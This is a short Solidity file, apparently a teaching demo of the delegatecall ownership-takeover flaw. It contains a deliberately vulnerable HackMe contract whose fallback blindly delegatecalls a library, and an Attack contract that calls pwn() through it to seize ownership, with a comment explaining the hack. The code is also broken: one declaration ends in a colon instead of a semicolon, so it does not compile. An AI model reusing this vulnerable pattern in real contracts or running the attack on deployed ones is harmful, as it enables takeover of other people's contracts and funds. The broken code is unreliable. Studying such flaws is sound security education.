// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

//This hack is simple: the hackMe contract has a fallback function that calls functions from the Lib contract within the hackMe contract context
//When the attack function is executed, the hackMe fallback is activated and forwards function calls to Lib, pwn is then activated and msg.sender 
//is set as the new owner of HackMe, it being the contract Attack
contract HackMe {
    address public owner;
    Lib public lib:

    constructor(Lib _libAddress){
        owner = msg.sender;
        lib = Lib(_libAddress);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;
    constructor(address _hackMeAddress) {
        hackMe = _hackMeAddress;
    }
    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}